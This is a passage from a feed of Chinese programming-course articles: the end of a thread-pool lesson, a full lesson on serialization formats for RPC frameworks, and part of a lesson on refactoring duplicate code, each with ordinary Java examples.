&lt;p>就线程池混用问题，我想再和你补充一个坑：&lt;strong>Java 8 的 parallel stream 功能，可以让我们很方便地并行处理集合中的元素，其背后是共享同一个 ForkJoinPool，默认并行度是 CPU 核数 -1&lt;/strong>。对于 CPU 绑定的任务来说，使用这样的配置比较合适，但如果集合操作涉及同步 IO 操作的话（比如数据库操作、外部服务调用等），建议自定义一个 ForkJoinPool（或普通线程池）。你可以参考第一讲的相关 Demo。&lt;/p>
&lt;h1 id="重点回顾">重点回顾&lt;/h1>
&lt;p>线程池管理着线程，线程又属于宝贵的资源，有许多应用程序的性能问题都来自线程池的配置和使用不当。在今天的学习中，我通过三个和线程池相关的生产事故，和你分享了使用线程池的几个最佳实践。&lt;/p>
&lt;p>第一，Executors 类提供的一些快捷声明线程池的方法虽然简单，但隐藏了线程池的参数细节。因此，使用线程池时，我们一定要根据场景和需求配置合理的线程数、任务队列、拒绝策略、线程回收策略，并对线程进行明确的命名方便排查问题。&lt;/p>
&lt;p>第二，既然使用了线程池就需要确保线程池是在复用的，每次 new 一个线程池出来可能比不用线程池还糟糕。如果你没有直接声明线程池而是使用其他同学提供的类库来获得一个线程池，请务必查看源码，以确认线程池的实例化方式和配置是符合预期的。&lt;/p>
&lt;p>第三，复用线程池不代表应用程序始终使用同一个线程池，我们应该根据任务的性质来选用不同的线程池。特别注意 IO 绑定的任务和 CPU 绑定的任务对于线程池属性的偏好，如果希望减少任务间的相互干扰，考虑按需使用隔离的线程池。&lt;/p>
&lt;p>最后我想强调的是，&lt;strong>线程池作为应用程序内部的核心组件往往缺乏监控&lt;/strong>（如果你使用类似 RabbitMQ 这样的 MQ 中间件，运维同学一般会帮我们做好中间件监控），往往到程序崩溃后才发现线程池的问题，很被动。在设计篇中我们会重新谈及这个问题及其解决方案。&lt;/p>
&lt;p>今天用到的代码，我都放在了 GitHub 上，你可以点击这个链接查看。&lt;/p>
&lt;h1 id="思考与讨论">思考与讨论&lt;/h1>
&lt;ul>
&lt;li>在第一节中我们提到，或许一个激进创建线程的弹性线程池更符合我们的需求，你能给出相关的实现吗？实现后再测试一下，是否所有的任务都可以正常处理完成呢？&lt;/li>
&lt;li>在第二节中，我们改进了 ThreadPoolHelper 使其能够返回复用的线程池。如果我们不小心每次都创建了这样一个自定义的线程池（10 核心线程，50 最大线程，2 秒回收的），反复执行测试接口线程，最终可以被回收吗？会出现 OOM 问题吗？&lt;/li>
&lt;/ul>
&lt;p>你还遇到过线程池相关的其他坑吗？我是朱晔，欢迎在评论区与我留言分享你的想法，也欢迎你把这篇文章分享给你的朋友或同事，一起交流。&lt;/p></description></item><item><title>极客专栏: 03丨序列化：对象怎么在网络中传输？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/rpc%E5%AE%9E%E6%88%98%E4%B8%8E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/03%E4%B8%A8%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E6%80%8E%E4%B9%88%E5%9C%A8%E7%BD%91%E7%BB%9C%E4%B8%AD%E4%BC%A0%E8%BE%93/</link><pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/rpc%E5%AE%9E%E6%88%98%E4%B8%8E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/03%E4%B8%A8%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E6%80%8E%E4%B9%88%E5%9C%A8%E7%BD%91%E7%BB%9C%E4%B8%AD%E4%BC%A0%E8%BE%93/</guid><description>
&lt;p>你好，我是何小锋。上一讲我讲解了在 RPC 框架中，如何设计可扩展的、向后兼容的协议，其关键点就是利用好 Header 中的扩展字段以及 Payload 中的扩展字段，通过扩展字段向后兼容。&lt;/p>
&lt;p>那么承接上一讲的一个重点，今天我会讲解下 RPC 框架中的序列化。要知道，在不同的场景下合理地选择序列化方式，对提升 RPC 框架整体的稳定性和性能是至关重要的。&lt;/p>
&lt;h1 id="为什么需要序列化">为什么需要序列化？&lt;/h1>
&lt;p>首先，我们得知道什么是序列化与反序列化。&lt;/p>
&lt;p>我们先回顾下[第 01 讲] 介绍过的 RPC 原理的内容，在描述 RPC 通信流程的时候我说过：&lt;/p>
&lt;p>网络传输的数据必须是二进制数据，但调用方请求的出入参数都是对象。对象是不能直接在网络中传输的，所以我们需要提前把它转成可传输的二进制，并且要求转换算法是可逆的，这个过程我们一般叫做&amp;quot;序列化&amp;quot;。 这时，服务提供方就可以正确地从二进制数据中分割出不同的请求，同时根据请求类型和序列化类型，把二进制的消息体逆向还原成请求对象，这个过程我们称之为&amp;quot;反序列化&amp;quot;。&lt;/p>
&lt;p>这两个过程如下图所示：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/d2/04/d215d279ef8bfbe84286e81174b4e704.jpg" alt="">&lt;br>
序列化与反序列化&lt;/p>
&lt;p>**总结来说，**序列化就是将对象转换成二进制数据的过程，而反序列就是反过来将二进制转换为对象的过程。&lt;/p>
&lt;p>那么 RPC 框架为什么需要序列化呢？还是请你回想下 RPC 的通信流程：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/82/59/826a6da653c4093f3dc3f0a833915259.jpg" alt="">&lt;br>
RPC通信流程图&lt;/p>
&lt;p>不妨借用个例子帮助你理解，比如发快递，我们要发一个需要自行组装的物件。发件人发之前，会把物件拆开装箱，这就好比序列化；这时候快递员来了，不能磕碰呀，那就要打包，这就好比将序列化后的数据进行编码，封装成一个固定格式的协议；过了两天，收件人收到包裹了，就会拆箱将物件拼接好，这就好比是协议解码和反序列化。&lt;/p>
&lt;p>所以现在你清楚了吗？因为网络传输的数据必须是二进制数据，所以在 RPC 调用中，对入参对象与返回值对象进行序列化与反序列化是一个必须的过程。&lt;/p>
&lt;h1 id="有哪些常用的序列化">有哪些常用的序列化？&lt;/h1>
&lt;p>那这么看来，你会不会觉得这个过程很简单呢？实则不然，很复杂。我们可以先看看都有哪些常用的序列化，下面我来简单地介绍下几种常用的序列化方式。&lt;/p>
&lt;h1 id="jdk-原生序列化">JDK 原生序列化&lt;/h1>
&lt;p>如果你会使用 Java 语言开发，那么你一定知道 JDK 原生的序列化，下面是 JDK 序列化的一个例子：&lt;/p>
&lt;pre tabindex="0">&lt;code>import java.io.*;
public class Student implements Serializable {
//学号
private int no;
//姓名
private String name;
public int getNo() {
return no;
}
public void setNo(int no) {
this.no = no;
}
public String getName() {
return name;
}
public void setName(String name) {
this.name = name;
}
@Override
public String toString() {
return &amp;#34;Student{&amp;#34; +
&amp;#34;no=&amp;#34; + no +
&amp;#34;, name=&amp;#39;&amp;#34; + name + &amp;#39;\&amp;#39;&amp;#39; +
&amp;#39;}&amp;#39;;
}
public static void main(String[] args) throws IOException, ClassNotFoundException {
String home = System.getProperty(&amp;#34;user.home&amp;#34;);
String basePath = home + &amp;#34;/Desktop&amp;#34;;
FileOutputStream fos = new FileOutputStream(basePath + &amp;#34;student.dat&amp;#34;);
Student student = new Student();
student.setNo(100);
student.setName(&amp;#34;TEST_STUDENT&amp;#34;);
ObjectOutputStream oos = new ObjectOutputStream(fos);
oos.writeObject(student);
oos.flush();
oos.close();
FileInputStream fis = new FileInputStream(basePath + &amp;#34;student.dat&amp;#34;);
ObjectInputStream ois = new ObjectInputStream(fis);
Student deStudent = (Student) ois.readObject();
ois.close();
System.out.println(deStudent);
}
}
&lt;/code>&lt;/pre>&lt;p>我们可以看到，JDK 自带的序列化机制对使用者而言是非常简单的。序列化具体的实现是由 ObjectOutputStream 完成的，而反序列化的具体实现是由 ObjectInputStream 完成的。&lt;/p>
&lt;p>那么 JDK 的序列化过程是怎样完成的呢？我们看下下面这张图：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/7e/9f/7e2616937e3bc5323faf3ba4c09d739f.jpg" alt="">&lt;br>
ObjectOutputStream序列化过程图&lt;/p>
&lt;p>序列化过程就是在读取对象数据的时候，不断加入一些特殊分隔符，这些特殊分隔符用于在反序列化过程中截断用。&lt;/p>
&lt;ul>
&lt;li>头部数据用来声明序列化协议、序列化版本，用于高低版本向后兼容&lt;/li>
&lt;li>对象数据主要包括类名、签名、属性名、属性类型及属性值，当然还有开头结尾等数据，除了属性值属于真正的对象值，其他都是为了反序列化用的元数据&lt;/li>
&lt;li>存在对象引用、继承的情况下，就是递归遍历&amp;quot;写对象&amp;quot;逻辑&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>实际上任何一种序列化框架，核心思想就是设计一种序列化协议&lt;/strong>，将对象的类型、属性类型、属性值一一按照固定的格式写到二进制字节流中来完成序列化，再按照固定的格式一一读出对象的类型、属性类型、属性值，通过这些信息重新创建出一个新的对象，来完成反序列化。&lt;/p>
&lt;h1 id="json">JSON&lt;/h1>
&lt;p>JSON 可能是我们最熟悉的一种序列化格式了，JSON 是典型的 Key-Value 方式，没有数据类型，是一种文本型序列化框架，JSON 的具体格式和特性，网上相关的资料非常多，这里就不再介绍了。&lt;/p>
&lt;p>他在应用上还是很广泛的，无论是前台 Web 用 Ajax 调用、用磁盘存储文本类型的数据，还是基于 HTTP 协议的 RPC 框架通信，都会选择 JSON 格式。&lt;/p>
&lt;p>但用 JSON 进行序列化有这样两个问题，你需要格外注意：&lt;/p>
&lt;ul>
&lt;li>JSON 进行序列化的额外空间开销比较大，对于大数据量服务这意味着需要巨大的内存和磁盘开销；&lt;/li>
&lt;li>JSON 没有类型，但像 Java 这种强类型语言，需要通过反射统一解决，所以性能不会太好。&lt;/li>
&lt;/ul>
&lt;p>所以如果 RPC 框架选用 JSON 序列化，服务提供者与服务调用者之间传输的数据量要相对较小，否则将严重影响性能。&lt;/p>
&lt;h1 id="hessian">Hessian&lt;/h1>
&lt;p>Hessian 是动态类型、二进制、紧凑的，并且可跨语言移植的一种序列化框架。Hessian 协议要比 JDK、JSON 更加紧凑，性能上要比 JDK、JSON 序列化高效很多，而且生成的字节数也更小。&lt;/p>
&lt;p>使用代码示例如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>Student student = new Student();
student.setNo(101);
student.setName(&amp;#34;HESSIAN&amp;#34;);
//把student对象转化为byte数组
ByteArrayOutputStream bos = new ByteArrayOutputStream();
Hessian2Output output = new Hessian2Output(bos);
output.writeObject(student);
output.flushBuffer();
byte[] data = bos.toByteArray();
bos.close();
//把刚才序列化出来的byte数组转化为student对象
ByteArrayInputStream bis = new ByteArrayInputStream(data);
Hessian2Input input = new Hessian2Input(bis);
Student deStudent = (Student) input.readObject();
input.close();
System.out.println(deStudent);
&lt;/code>&lt;/pre>&lt;p>相对于 JDK、JSON，由于 Hessian 更加高效，生成的字节数更小，有非常好的兼容性和稳定性，所以 Hessian 更加适合作为 RPC 框架远程通信的序列化协议。&lt;/p>
&lt;p>但 Hessian 本身也有问题，官方版本对 Java 里面一些常见对象的类型不支持，比如：&lt;/p>
&lt;ul>
&lt;li>Linked 系列，LinkedHashMap、LinkedHashSet 等，但是可以通过扩展 CollectionDeserializer 类修复；&lt;/li>
&lt;li>Locale 类，可以通过扩展 ContextSerializerFactory 类修复；&lt;/li>
&lt;li>Byte/Short 反序列化的时候变成 Integer。&lt;/li>
&lt;/ul>
&lt;p>以上这些情况，你在实践时需要格外注意。&lt;/p>
&lt;h1 id="protobuf">Protobuf&lt;/h1>
&lt;p>Protobuf 是 Google 公司内部的混合语言数据标准，是一种轻便、高效的结构化数据存储格式，可以用于结构化数据序列化，支持 Java、Python、C++、Go 等语言。Protobuf 使用的时候需要定义 IDL（Interface description language），然后使用不同语言的 IDL 编译器，生成序列化工具类，它的优点是：&lt;/p>
&lt;ul>
&lt;li>序列化后体积相比 JSON、Hessian 小很多；&lt;/li>
&lt;li>IDL 能清晰地描述语义，所以足以帮助并保证应用程序之间的类型不会丢失，无需类似 XML 解析器；&lt;/li>
&lt;li>序列化反序列化速度很快，不需要通过反射获取类型；&lt;/li>
&lt;li>消息格式升级和兼容性不错，可以做到向后兼容。&lt;/li>
&lt;/ul>
&lt;p>使用代码示例如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>/**
*
* // IDl 文件格式
* synax = &amp;#34;proto3&amp;#34;;
* option java_package = &amp;#34;com.test&amp;#34;;
* option java_outer_classname = &amp;#34;StudentProtobuf&amp;#34;;
*
* message StudentMsg {
* //序号
* int32 no = 1;
* //姓名
* string name = 2;
* }
*
*/
StudentProtobuf.StudentMsg.Builder builder = StudentProtobuf.StudentMsg.newBuilder();
builder.setNo(103);
builder.setName(&amp;#34;protobuf&amp;#34;);
//把student对象转化为byte数组
StudentProtobuf.StudentMsg msg = builder.build();
byte[] data = msg.toByteArray();
//把刚才序列化出来的byte数组转化为student对象
StudentProtobuf.StudentMsg deStudent = StudentProtobuf.StudentMsg.parseFrom(data);
System.out.println(deStudent);
&lt;/code>&lt;/pre>&lt;p>Protobuf 非常高效，但是对于具有反射和动态能力的语言来说，这样用起来很费劲，这一点就不如 Hessian，比如用 Java 的话，这个预编译过程不是必须的，可以考虑使用 Protostuff。&lt;/p>
&lt;p>Protostuff 不需要依赖 IDL 文件，可以直接对 Java 领域对象进行反 / 序列化操作，在效率上跟 Protobuf 差不多，生成的二进制格式和 Protobuf 是完全相同的，可以说是一个 Java 版本的 Protobuf 序列化框架。但在使用过程中，我遇到过一些不支持的情况，也同步给你：&lt;/p>
&lt;ul>
&lt;li>不支持 null；&lt;/li>
&lt;li>ProtoStuff 不支持单纯的 Map、List 集合对象，需要包在对象里面。&lt;/li>
&lt;/ul>
&lt;h1 id="rpc-框架中如何选择序列化">RPC 框架中如何选择序列化？&lt;/h1>
&lt;p>我刚刚简单地介绍了几种最常见的序列化协议，其实远不止这几种，还有 Message pack、kryo 等。那么面对这么多的序列化协议，在 RPC 框架中我们该如何选择呢？&lt;/p>
&lt;p>首先你可能想到的是性能和效率，不错，这的确是一个非常值得参考的因素。我刚才讲过，序列化与反序列化过程是 RPC 调用的一个必须过程，那么序列化与反序列化的性能和效率势必将直接关系到 RPC 框架整体的性能和效率。&lt;/p>
&lt;p>那除了这点，你还想到了什么？&lt;/p>
&lt;p>对，还有空间开销，也就是序列化之后的二进制数据的体积大小。序列化后的字节数据体积越小，网络传输的数据量就越小，传输数据的速度也就越快，由于 RPC 是远程调用，那么网络传输的速度将直接关系到请求响应的耗时。&lt;/p>
&lt;p>现在请你再想想，还有什么因素可以影响到我们的选择？&lt;/p>
&lt;p>没错，就是序列化协议的通用性和兼容性。在 RPC 的运营中，序列化问题恐怕是我碰到的和解答过的最多的问题了，经常有业务会向我反馈这个问题，比如某个类型为集合类的入参服务调用者不能解析了，服务提供方将入参类加一个属性之后服务调用方不能正常调用，升级了 RPC 版本后发起调用时报序列化异常了&amp;hellip;&lt;/p>
&lt;p>在序列化的选择上，与序列化协议的效率、性能、序列化协议后的体积相比，其通用性和兼容性的优先级会更高，因为他是会直接关系到服务调用的稳定性和可用率的，对于服务的性能来说，服务的可靠性显然更加重要。我们更加看重这种序列化协议在版本升级后的兼容性是否很好，是否支持更多的对象类型，是否是跨平台、跨语言的，是否有很多人已经用过并且踩过了很多的坑，其次我们才会去考虑性能、效率和空间开销。&lt;/p>
&lt;p>还有一点我要特别强调。除了序列化协议的通用性和兼容性，序列化协议的安全性也是非常重要的一个参考因素，甚至应该放在第一位去考虑。以 JDK 原生序列化为例，它就存在漏洞。如果序列化存在安全漏洞，那么线上的服务就很可能被入侵。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/b4/a5/b42e44968c3fdcdfe2acf96377f5b2a5.jpg" alt="">&lt;/p>
&lt;p>综合上面几个参考因素，现在我们再来总结一下这几个序列化协议。&lt;/p>
&lt;p>我们首选的还是 Hessian 与 Protobuf，因为他们在性能、时间开销、空间开销、通用性、兼容性和安全性上，都满足了我们的要求。其中 Hessian 在使用上更加方便，在对象的兼容性上更好；Protobuf 则更加高效，通用性上更有优势。&lt;/p>
&lt;h1 id="rpc-框架在使用时要注意哪些问题">RPC 框架在使用时要注意哪些问题？&lt;/h1>
&lt;p>了解了在 RPC 框架中如何选择序列化，那么我们在使用过程中需要注意哪些序列化上的问题呢？&lt;/p>
&lt;p>我刚才讲过，在 RPC 的运营中，我遇到的最多的问题就是序列化问题了，除了早期 RPC 框架本身出现的问题以外，大多数问题都是使用方使用不正确导致的，接下来我们就盘点下这些高频出现的人为问题。&lt;/p>
&lt;p>**对象构造得过于复杂：**属性很多，并且存在多层的嵌套，比如 A 对象关联 B 对象，B 对象又聚合 C 对象，C 对象又关联聚合很多其他对象，对象依赖关系过于复杂。序列化框架在序列化与反序列化对象时，对象越复杂就越浪费性能，消耗 CPU，这会严重影响 RPC 框架整体的性能；另外，对象越复杂，在序列化与反序列化的过程中，出现问题的概率就越高。&lt;/p>
&lt;p>**对象过于庞大：**我经常遇到业务过来咨询，为啥他们的 RPC 请求经常超时，排查后发现他们的入参对象非常得大，比如为一个大 List 或者大 Map，序列化之后字节长度达到了上兆字节。这种情况同样会严重地浪费了性能、CPU，并且序列化一个如此大的对象是很耗费时间的，这肯定会直接影响到请求的耗时。&lt;/p>
&lt;p>**使用序列化框架不支持的类作为入参类：**比如 Hessian 框架，他天然是不支持 LinkHashMap、LinkedHashSet 等，而且大多数情况下最好不要使用第三方集合类，如 Guava 中的集合类，很多开源的序列化框架都是优先支持编程语言原生的对象。因此如果入参是集合类，应尽量选用原生的、最为常用的集合类，如 HashMap、ArrayList。&lt;/p>
&lt;p>**对象有复杂的继承关系：**大多数序列化框架在序列化对象时都会将对象的属性一一进行序列化，当有继承关系时，会不停地寻找父类，遍历属性。就像问题 1 一样，对象关系越复杂，就越浪费性能，同时又很容易出现序列化上的问题。&lt;/p>
&lt;p>在 RPC 框架的使用过程中，我们要尽量构建简单的对象作为入参和返回值对象，避免上述问题。&lt;/p>
&lt;h1 id="总结">总结&lt;/h1>
&lt;p>今天我们深入学习了什么是序列化，并介绍了如 JDK 原生序列化、JSON、Hessian 以及 Protobuf 等几种常见的序列化方式。&lt;/p>
&lt;p>除了这些基础知识之外，我们重点讲解了在 RPC 框架中如何去选择序列化协议，我们有这样几个很重要的参考因素，优先级从高到低依次是安全性、通用性和兼容性，之后我们会再考虑序列化框架的性能、效率和空间开销。&lt;/p>
&lt;p>这归根结底还是因为服务调用的稳定性与可靠性，要比服务的性能与响应耗时更加重要。另外对于 RPC 调用来说，整体调用上，最为耗时、最消耗性能的操作大多都是服务提供者执行业务逻辑的操作，这时序列化的开销对于服务整体的开销来说影响相对较小。&lt;/p>
&lt;p>在使用 RPC 框架的过程中，我们构造入参、返回值对象，主要记住以下几点：&lt;/p>
&lt;ul>
&lt;li>对象要尽量简单，没有太多的依赖关系，属性不要太多，尽量高内聚；&lt;/li>
&lt;li>入参对象与返回值对象体积不要太大，更不要传太大的集合；&lt;/li>
&lt;li>尽量使用简单的、常用的、开发语言原生的对象，尤其是集合类；&lt;/li>
&lt;li>对象不要有复杂的继承关系，最好不要有父子类的情况。&lt;/li>
&lt;/ul>
&lt;p>实际上，虽然 RPC 框架可以让我们发起全程调用就像调用本地，但在 RPC 框架的传输过程中，入参与返回值的根本作用就是用来传递信息的，为了提高 RPC 调用整体的性能和稳定性，我们的入参与返回值对象要构造得尽量简单，这很重要。&lt;/p>
&lt;h1 id="课后思考">课后思考&lt;/h1>
&lt;p>RPC 框架在序列化框架的选型上，你认为还需要考虑哪些因素？你还知道哪些优秀的序列化框架，它们又是否适合在 RPC 调用中使用？&lt;/p>
&lt;p>欢迎留言和我分享你的答案和经验，也欢迎你把文章分享给你的朋友，邀请他加入学习。我们下节课再见！&lt;/p></description></item><item><title>极客专栏: 03丨重复代码：简单需求到处修改，怎么办？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/03%E4%B8%A8%E9%87%8D%E5%A4%8D%E4%BB%A3%E7%A0%81%E7%AE%80%E5%8D%95%E9%9C%80%E6%B1%82%E5%88%B0%E5%A4%84%E4%BF%AE%E6%94%B9%E6%80%8E%E4%B9%88%E5%8A%9E/</link><pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/03%E4%B8%A8%E9%87%8D%E5%A4%8D%E4%BB%A3%E7%A0%81%E7%AE%80%E5%8D%95%E9%9C%80%E6%B1%82%E5%88%B0%E5%A4%84%E4%BF%AE%E6%94%B9%E6%80%8E%E4%B9%88%E5%8A%9E/</guid><description>
&lt;p>你好，我是郑晔。&lt;/p>
&lt;p>前面两讲，我们讨论了命名中的坏味道。今天，我们来讨论另外一个常见的坏味道：重复代码。&lt;/p>
&lt;p>记得我刚开始工作的时候，有人开玩笑说，编程实际上就是 CVS（CVS 是当时流行的一个版本控制工具，相当于今天的 Git），也就是 Ctrl+C、Ctrl+V、Ctrl+S，或许你已经听出来了，这是在调侃很多程序员写程序依靠的是复制粘贴。&lt;/p>
&lt;p>时至今日，很多初级程序员写代码依然规避不了复制粘贴，基本的做法就是把一段代码复制过来，改动几个地方，然后，跑一下没有太大问题就万事大吉了。殊不知，这种做法就是在给未来挖坑。&lt;/p>
&lt;p>通常情况下，只要这些复制代码其中有一点逻辑要修改，就意味着所有复制粘贴的地方都要修改。所以，我们在实际的项目中，常常看见这样的情况：明明是一个简单的需求，你却需要改很多的地方，需要花费很长的时间，结果无论是项目经理，还是产品经理，对进度都很不满意。&lt;/p>
&lt;p>更可怕的是，只要你少改了一处，就意味着留下一处潜在的问题。问题会在不经意间爆发出来，让人陷入难堪的境地。&lt;/p>
&lt;p>复制粘贴是最容易产生重复代码的地方，所以，一个最直白的建议就是，不要使用复制粘贴。&lt;strong>真正应该做的是，先提取出函数，然后，在需要的地方调用这个函数。&lt;/strong>&lt;/p>
&lt;p>其实，复制粘贴的重复代码是相对容易发现的，但有一些代码是有类似的结构，这也是重复代码，有些人对这类坏味道却视而不见。&lt;/p>
&lt;h1 id="重复的结构">重复的结构&lt;/h1>
&lt;p>我们看一下下面的几段代码：&lt;/p>
&lt;pre tabindex="0">&lt;code>@Task
public void sendBook() {
try {
this.service.sendBook();
} catch (Throwable t) {
this.notification.send(new SendFailure(t)));
throw t;
}
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>@Task
public void sendChapter() {
try {
this.service.sendChapter();
} catch (Throwable t) {
this.notification.send(new SendFailure(t)));
throw t;
}
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>@Task
public void startTranslation() {
try {
this.service.startTranslation();
} catch (Throwable t) {
this.notification.send(new SendFailure(t)));
throw t;
}
}
&lt;/code>&lt;/pre>&lt;p>这三段函数业务的背景是：一个系统要把作品的相关信息发送给翻译引擎。所以，结合着代码，我们就不难理解它们的含义，sendBook 是把作品信息发出去，sendChapter 就是把章节发送出去，而 startTranslation 则是启动翻译。&lt;/p>
&lt;p>这几个业务都是以后台的方式在执行，所以，它们的函数签名上增加了一个 Task 的 Annotation，表明它们是任务调度的入口。然后，实际的代码执行放到了对应的业务方法上，也就是 service 里面的方法。&lt;/p>
&lt;p>这三个函数可能在许多人看来已经写得很简洁了，但是，这段代码的结构上却是有重复的，请把注意力放到 catch 语句里。&lt;/p>
&lt;p>之所以要做一次捕获（catch），是为了防止系统出问题无人发觉。捕获到异常后，我们把出错的信息通过即时通讯工具发给相关人等，代码里的 notification.send 就是发通知的入口。相比于原来的业务逻辑，这个逻辑是后来加上的，所以，这段代码的作者不厌其烦地在每一处修改了代码。&lt;/p>
&lt;p>我们可以看到，虽然这三个函数调用的业务代码不同，但它们的结构是一致的，其基本流程可以理解为：&lt;/p>
&lt;ul>
&lt;li>调用业务函数；&lt;/li>
&lt;li>如果出错，发通知。&lt;/li>
&lt;/ul>
&lt;p>当你能够发现结构上的重复，我们就可以把这个结构提取出来。从面向对象的设计来说，就是提出一个接口，就像下面这样：&lt;/p>
&lt;pre tabindex="0">&lt;code>private void executeTask(final Runnable runnable) {
try {
runnable.run();
} catch (Throwable t) {
this.notification.send(new SendFailure(t)));
throw t;
}
}
&lt;/code>&lt;/pre>&lt;p>有了这个结构，前面几个函数就可以用它来改写了。对于支持函数式编程的程序设计语言来说，可以用语言提供的便利写法简化代码的编写，像下面的代码就是用了 Java 里的方法引用（Method Reference）：&lt;/p>
&lt;pre tabindex="0">&lt;code>@Task
public void sendBook() {
executeTask(this.service::sendBook);
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>@Task
public void sendChapter() {
executeTask(this.service::sendChapter);
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>@Task
public void startTranslation() {
executeTask(this.service::startTranslation);
}
&lt;/code>&lt;/pre>&lt;p>经过这个例子的改写，如果再有一些通用的结构调整，比如，在任务执行前后要加上一些日志信息，这样的改动就可以放到 executeTask 这个函数里，而不用四处去改写了。&lt;/p>
&lt;p>这个例子并不复杂，关键点在于，能不能发现结构上的重复。因为相比于直接复制的代码，结构上的重复看上去会有一些迷惑性。比如，在这个例子里，发送作品信息、发送章节、启动翻译看起来是三件不同的事，很难让人一下反应过来它也是重复代码。&lt;/p>
&lt;p>一般来说，参数是名词，而函数调用，是动词。我们传统的程序设计教育中，对于名词是极度重视的，但我们必须认识到一点，动词也扮演着重要的角色，尤其是在函数式编程兴起之后。那你就需要知道，动词不同时，并不代表没有重复代码产生。&lt;/p>
&lt;p>理解到这一点，我们就容易发现结构上的相似之处。比如在上面的例子中，发送作品信息、发送章节、启动翻译之所以看上去是三件不同的事，只是因为它们的动词不同，但是除了这几个动词之外的其它部分是相同的，所以，它们在结构上是重复的。&lt;/p>
&lt;h1 id="做真正的选择">做真正的选择&lt;/h1>
&lt;p>我们再来看一段代码：&lt;/p>
&lt;pre tabindex="0">&lt;code>if (user.isEditor()) {
service.editChapter(chapterId, title, content, true);
} else {
service.editChapter(chapterId, title, content, false);
}
&lt;/code>&lt;/pre>&lt;p>这是一段对章节内容进行编辑的代码。这里有一个业务逻辑，章节只有在审核通过之后，才能去做后续的处理，比如，章节的翻译。所以，这里的 editChapter 方法最后那个参数表示是否审核通过。&lt;/p>
&lt;p>在这段代码里面，目前的处理逻辑是，如果这个章节是由作者来编辑的，那么这个章节是需要审核的，如果这个章节是由编辑来编辑的，那么审核就直接通过了，因为编辑本身同时也是审核人。不过，这里的业务逻辑不是重点，只是帮助你理解这段代码。&lt;/p>
&lt;p>问题来了，这个 if 选择的到底是什么呢？&lt;/p>
&lt;p>相信你和我一样，第一眼看到这段代码的感觉一定是，if 选择的一定是两段不同的业务处理。但只要你稍微看一下，就会发现，if 和 else 两段代码几乎是一模一样的。在经过仔细地&amp;quot;找茬&amp;quot;之后，才能发现，原来是最后一个参数不一样。&lt;/p>
&lt;p>只有参数不同，是不是和前面说的重复代码是如出一辙的？没错，这其实也是一种重复代码。&lt;/p>
&lt;p>只不过，这种重复代码通常情况下是作者自己写出来的，而不是粘贴出来的。因为作者在写这段代码时，**脑子只想到 if 语句判断之后要做什么，而没有想到这个 if 语句判断的到底是什么。**但这段代码客观上也造就了重复。&lt;/p>
&lt;p>写代码要有表达性。把意图准确地表达出来，是写代码过程中非常重要的一环。显然，这里的 if 判断区分的是参数，而非动作。所以，我们可以把这段代码稍微调整一下，会让代码看上去更容易理解：&lt;/p>
&lt;pre tabindex="0">&lt;code>boolean approved = user.isEditor();
service.editChapter(chapterId, title, content, approved);
&lt;/code>&lt;/pre>&lt;p>请注意，这里我把 user.isEditor() 判断的结果赋值给了一个 approved 的变量，而不是直接作为一个参数传给 editChapter，这么做也是为了提高这段代码的可读性。因为 editChapter 最后一个参数表示的是这个章节是否审核通过。通过引入 approved 变量，我们可以清楚地看到，一个章节审核是否通过的判断条件是&amp;quot;用户是否是一个编辑&amp;quot;，这种写法会让代码更清晰。&lt;/p>
&lt;p>如果将来审核通过的条件改变了，变化的点全都在 approved 的这个变量的赋值上面。如果你追求更有表达性的做法，甚至可以提取一个函数出来，这样，就把变化都放到这个函数里了，就像下面这样：&lt;/p>
&lt;pre tabindex="0">&lt;code>boolean approved = isApproved(user);
service.editChapter(chapterId, title, content, approved);
private boolean isApproved(final User user) {
return user.isEditor();
}
&lt;/code>&lt;/pre>&lt;p>为了说明问题，我特意选择了一段简单的代码，if 语句的代码块里只有一个语句。在实际的工作中，if 语句没有有效地去选择目标是经常出现的，有的是参数列表比较长，有的是在 if 的代码块里有多个语句。&lt;/p>
&lt;p>所以，**只要你看到 if 语句出现，而且 if 和 else 的代码块长得又比较像，多半就是出现了这个坏味道。**如果你不想所有人都来玩&amp;quot;找茬&amp;quot;游戏，赶紧消灭它。&lt;/p>
&lt;p>重复是一个泥潭，对于程序员来说，时刻提醒自己不要重复是至关重要的。在软件开发里，有一个重要的原则叫做 Don&amp;rsquo;t Repeat Yourself（不要重复自己，简称 DRY），我在《软件设计之美》中也讲到过它，而更经典的叙述在《程序员修炼之道》中。&lt;/p>
&lt;blockquote>
&lt;p>在一个系统中，每一处知识都必须有单一、明确、权威地表述。
Every piece of knowledge must have a single, unambiguous, authoritative representation within a system.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>写代码要想做到 DRY，一个关键点是能够发现重复&lt;/strong>。发现重复，一种是在泥潭中挣扎后，被动地发现，还有一种是提升自己识别能力，主动地发现重复。这种主动识别的能力，其实背后要有对软件设计更好的理解，尤其是对分离关注点的理解（如果你对&amp;quot;分离关注点&amp;quot;的知识感兴趣，可以参考我在《软件设计之美》中的02讲）。&lt;/p>
&lt;h1 id="总结时刻">总结时刻&lt;/h1>
